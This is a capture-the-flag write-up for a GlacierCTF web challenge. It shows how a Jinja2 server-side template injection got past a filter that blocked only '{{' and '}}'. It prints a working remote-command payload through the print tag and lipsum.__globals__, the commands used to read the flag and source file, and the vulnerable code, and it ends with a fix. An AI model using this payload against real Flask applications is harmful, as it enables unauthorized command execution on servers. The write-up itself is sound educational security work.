# Team-Check: bypassing a Jinja2 SSTI blacklist with the print tag

[Русская версия](solve.ru.md)

## 1. Application behavior

The site at `https://teamcheck.web.glacierctf.com/` provides a “Teamname” input. The form sends `GET /check_team?teamname=...`. For an unknown team, the response contains:

```html
<h3 class="alert info"> We are unsure if test has used AI in the past. </h3>
```

The special names in the server's two lists result in green (probably no AI use) or red (known AI use) alerts; unknown names produce a blue informational alert. That functionality is incidental to the vulnerability: the input becomes part of a Jinja template **before** the team list comparisons.

The challenge source was **not available from the organizer archive** at investigation time. The original `team-check.tar.gz` URL returned HTTP 502. The investigator instead recovered `/app/app.py` from the running container after achieving RCE. Its archived dump includes:

```python
team_name = flask.request.args.get("teamname")
if not team_name:
    return render_template('index.html')

# Security-Checks
if "{{" in team_name or "}}" in team_name:
    return render_template('index.html')

team_msg = flask.render_template_string(
    f"We are unsure if {team_name} has used AI in the past."
)
```

This is **server-side template injection (SSTI)**. User input is inserted into the Jinja2 template source, not passed as a safely escaped variable. Jinja parses and executes anything with valid syntax in that position.

## 2. What the blacklist actually prevents

The author tried to reject Jinja's `{{ expression }}` format by checking for literal `{{` or `}}`. This does block simple probes containing those substrings; the returned HTML matches the initial form without an alert message. But the blacklist ignores Jinja2 statement delimiters `{%` and `%}`.

The retained investigation distinguishes the probes:

| Probe | Observed behavior |
| --- | --- |
| `test` | HTTP 200, echoed in info alert |
| `' OR 1=1-- -` and equivalent quotes | reflected literally; no SQL injection |
| `<%=7*7%>` | HTML escaped |
| `${7*7}` | not interpreted |
| `{{7*7}}`, `a{{7*7}}`, `{{config}}` | blocked (no alert) |
| `{%if 1%}X{%endif%}` | informational alert containing `X` |
| `{%print(7*7)%}` | informational alert containing **49** |

The response to `{%print(7*7)%}` was preserved as the original 1,273-byte `evidence/ssti_49_response.html`, not merely recorded in the retrospective report.

## 3. From template expression to commands

Jinja's `print` statement evaluates the expression between `{% ... %}` and includes its string representation in the rendered output. In a Flask/Jinja environment, `lipsum` (the built-in placeholder-text helper) exposes a Python globals mapping containing the `os` module.

The winning probe:

```jinja2
{%print(lipsum.__globals__['os'].popen('id').read())%}
```

returned `uid=0(root) gid=0(root)` (with additional groups), confirming remote command execution in the application process with root privileges.

The attacker then used:

```shell
python3 scripts/ssti.py 'ls -la /'
python3 scripts/ssti.py 'ls -la /app'
python3 scripts/ssti.py 'cat /flag.txt'
python3 scripts/ssti.py 'cat /app/app.py'
```

The root directory contained `flag.txt` (70 bytes). The `cat /flag.txt` command returned the full real `gctf{...}` flag, and reading `/app/app.py` confirmed the input-handling code.

The participant confirms the flag was accepted by the GlacierCTF platform. The full flag is redacted in the public write-up according to the repository's established convention.

## 4. The actual solver

The archive includes the historical `scripts/ssti.py` without additional dependencies. It:

1. Builds a Jinja `{%print(... )%}` payload with `lipsum.__globals__['os'].popen(repr(command)).read()`.
2. URL-encodes it into `GET /check_team?teamname=...`.
3. Sends the request using `urllib.request`.
4. Extracts the alert HTML, decodes HTML entities, and trims the site's standard message wrapping.

For example:

```shell
python3 scripts/ssti.py 'id'
python3 scripts/ssti.py 'cat /flag.txt'
```

The historical helper targeted the original challenge hostname. A separately configurable version would simply change the URL constant to a local deployment.

## 5. Negative tests and interpretation

The SQLi-style strings did not affect application behavior. `{{ ... }}` failed because of an explicit substring blacklist, not because Jinja expressions were evaluated safely. `{ { ... } }` did not form valid Jinja syntax. `{% raw %}` without a closing tag returned no useful message.

No more complex gadget chain was required. The code-execution primitive was exposed directly via `lipsum.__globals__`; the service ran as root, so `/flag.txt` was readable without bypassing filesystem privileges.

## 6. Evidence and limitations

The private `glacierctf_team-check_materials.zip` includes `REPORT.md`, `FLAG.txt`, CTFd challenge metadata, the historical solver, original HTML for the index and numeric SSTI probe, and an RCE dump of `app.py`.

The `app.py` dump came through HTML-escaped terminal output; its recovered team lists may contain transcription errors, such as missing commas. The vulnerable `render_template_string` and blacklist lines are legible in the saved material. The organizer tarball and original Jinja template file `templates/index.html` were not retained.

There is no separate saved raw HTTP response for `cat /flag.txt`, although the original investigation records successful execution and the recovered value. The report predates the participant's confirmation of platform acceptance. We treat the task as **solved and platform-accepted**, not as merely an unverified flag candidate.

## 7. Root cause and fix

Do not interpolate untrusted text into a Jinja template source. Render a static template and pass the user string as data, for example:

```python
return render_template("index.html", team_msg=f"We are unsure if {team_name} has used AI in the past.", info_color="info")
```

Use template escaping for display and avoid invoking `render_template_string` on user-derived source. A substring blacklist that only blocks `{{ ... }}` is not a security boundary.
